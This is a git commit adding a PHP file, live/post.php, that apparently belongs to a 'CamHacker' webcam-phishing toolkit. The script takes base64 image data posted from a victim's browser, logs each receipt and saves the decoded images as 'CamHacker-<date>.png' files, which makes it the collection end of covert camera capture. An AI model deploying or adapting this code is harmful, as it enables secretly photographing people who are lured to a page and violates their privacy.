1599ce404591d62d757537c398c1eeb73f5ba512
X Phantom (X PH4N70M) <70594016+XPH4N70M@users.noreply.github.com>
2022-05-29 21:10:07 +0530

    Add files via upload

---
+++ live/post.php
@@ -0,0 +1,19 @@
+<?php
+
+$date = date('dMYHis');
+$imageData=$_POST['cat'];
+
+if (!empty($_POST['cat'])) {
+error_log("Received" ."$date". "\r\n", 3, "log.txt");
+
+}
+
+$filteredData=substr($imageData, strpos($imageData, ",")+1);
+$unencodedData=base64_decode($filteredData);
+$fp = fopen( 'CamHacker-'.$date.'.png', 'wb' );
+fwrite( $fp, $unencodedData);
+fclose( $fp );
+
+exit();
+?>
+
